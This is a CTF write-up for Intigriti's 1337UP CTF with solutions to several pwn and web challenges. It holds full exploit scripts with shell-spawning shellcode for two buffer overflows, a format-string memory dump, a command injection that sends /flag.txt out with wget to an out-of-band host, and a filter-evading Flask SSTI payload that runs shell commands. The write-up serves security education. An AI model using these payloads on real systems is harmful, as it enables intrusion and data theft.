---
title: CTF Writeup - 1337UP CTF by Intigriti
author: istify
date: 2022-03-15
category: CTF
layout: post
---

# CTF Writeup - 1337UP CTF by Intigriti
This CTF was hosted by [Intigriti](https://www.intigriti.com/) before a live conference.

## Easy Register

This challenge was a basic stack buffer overflow with a stack leak. We used the leak to overwrite saved rip with the address of our shellcode.

```
#!/usr/bin/env python
# coding: utf-8
import sys
import time

def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    if len(args) == 2 and args[1] == "remote":
        p = remote("remote-server-url", 1234)
    else:
        p = process("./easy_register")

    # Try
    # p.recvlines(1), p.recv(10), p.readline()
    test = p.recvlines(7)
    overall_length = 88
    shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    leak = p64(int(test[-1].split(b"listing at ")[1].split(b".")[0], 16), endian="little")
    exploit = b"\x90" * (overall_length - len(shellcode) -20) + shellcode + b"\x90" * 20 + leak
    print(len(exploit))
    p.recvuntil(b"Hacker name >")
    p.sendline(exploit)
    # p.write('data'), p.write('data with newline')
    p.interactive()
    # Note that if your program never ends, you will never see any output
    print(p.recvall())
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

## Search Engine Redacted

This was a pwn challenge. There was a format string vulnerability in the search function, when the search term was not found. Our solution here is not really clean. We used a short python script to generate format strings, which read bytes from memory at a certain offset. We then pasted them into the search and found the flag in memory.

```
from os import *

for i in range(0,100,2):
    test = ""
    for j in range(2):
         test += "%" + str(i+j) + "$016lx"
         #test += "%" + str(i+j) + "$c"
    print("input:" + test)
    system("echo '" + test + "'| ./search_engine_redacted")
```

`1337UP{Th3s3_f0rm4ts_ar3_wh4ck!}`

## Cake
This was a pwn challenge. The executable has no protections enabled. We control the least significant byte of the `saved rbp` pointer in the `eat` function. The buffer, that we overwrite for this is 256 bytes long. Byte 257 overwrites the least significant byte of `saved rbp`. In our exploit we overwrite thies byte to decrease the value of `saved rbp`. This allows us to control the `saved rip`, when the next function (`menu`) returns. At this point we use a `jmp rsp` gadget to jump to a relative jump, which then takes us to the beginning of our shellcode, which we place at the beginning of our buffer.

```
#!/usr/bin/env python
# coding: utf-8
import sys
import time

def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    if len(args) == 2 and args[1] == "remote":
        p = remote("cake.ctf.intigriti.io", 9999)
    else:
        p = process("./cake")
        #p = gdb.debug("./cake", gdbscript='break eat')

    
    binary = ELF('./cake')

    # Choose right path, to get to the vulnerable read call
    p.recvuntil(b">")
    p.sendline(b"1")
    
    # Shellcode for dropping a shell
    shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    # jmp rsp gadget
    jmp_gadget = 0x0000000000400dbb
    
    exploit = b"\x90" * (32 - len(shellcode)) + shellcode
    # Generate jmp rsp + relative jmp with the right offset
    for i in range(32,256,16):
        print( "jmp $-0x"+ '{:02X}'.format(i +8))
        relative_jmp = asm("jmp $-0x"+ '{:02X}'.format(i +8))
        exploit += p64(jmp_gadget) + relative_jmp + b"\x90" * (8-len(relative_jmp)) 
    # Overwriting the least significant byte.
    exploit += b"\x08"
    print("[+] exploit:")
    print(exploit)

    print(len(exploit))
    # Receive until read call and send of manipulated buffer
    p.recvuntil(b"How many bites would you like? (1, 2, or 3):")
    p.send(exploit)
    
    # Hopefully drop shell here
    p.interactive()
    
    # Note that if your program never ends, you will never see any output
    print(p.recvall())
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

`1337UP{Wow_that_was_Quite_the_journey!}`

## Traveler

There was only one point in the application, that provided some interaction. So we played around with it and got an error:
```
<center>An error occurred whilst executing: bash check.sh Couple$(whoami)</center>
```

Seemed like command injection, but I got no output. So we started an `interactsh-client`:
```
~/go/bin/interactsh-client -v -o interactsh-logs.txt
```

We then with some trial an error crafted this request, which uses `wget` to post command output to the server. I found the flag in the root directory and leaked it this way:
```
POST /package-details.php HTTP/2
Host: traveller.ctf.intigriti.io
[...]

pack=Couple$(wget+http%3a//$(echo+test2).c8m9dmgkek6ds5otf660cesjpzyyyyyyn.oast.online/lsout+--post-data+"$(cat+/flag.txt)")&submit=Submit
```

On the `interactsh-client` we got:
```
------------
HTTP Request
------------
`
POST /lsout HTTP/1.1
Host: test2.c8m9dmgkek6ds5otf660cesjpzyyyyyyn.oast.online
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
User-Agent: Wget/1.20.3 (linux-gnu)

1337UP{C0MM4nd_Inj3ti0n}
```


## DeadTube

This is basically just one endpoint, that is obviously issuing requests, which means SSRF. We had source code access, that told us that the flag is given when issuing a request to `/flag` from localhost. 

To solve it we used an URL Shortener to redirect the connection to `https://127.0.01:8080/flag`.

`1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}`


## Quiz

Quiz, that allows us to earn points and gives a flag if we reach a 100 points (which is not possible). This is a simple race condition. We sent the request triggering a point increase to `turbo intruder` and used the `race.py` script to issue it 30 times. We were then able to buy the flag:

`1337UP{this_is_a_secret_flag}`

## 1Truth2Lies
This basically allows Flask SSTI on one endpoint, while the other two are not vulnerable. We need to URL encode the path, as it is quite strange. For this we used `cyberchef`. Then there is a basic filter, but one of the payloads from `PayloadAllTheThings` was not filtered. 

We issued the following request to retrieve the flag:
```
input={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat+flag*')|attr('read')()}} HTTP/2
[...]
```

In the response we got the flag:
```
HTTP/2 200 OK
Date: Sat, 12 Mar 2022 14:55:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 67
Set-Cookie: INGRESSCOOKIE=1647096911.236.13402.145793|dc1d9196c6bf1d67eb64d1980e38e24f; Path=/; Secure; HttpOnly

Your input: flag{1ea5n_h0w_vu1n_h1ppen_and_wh1t_l1ne_m1ke_vu1n!!!}
```


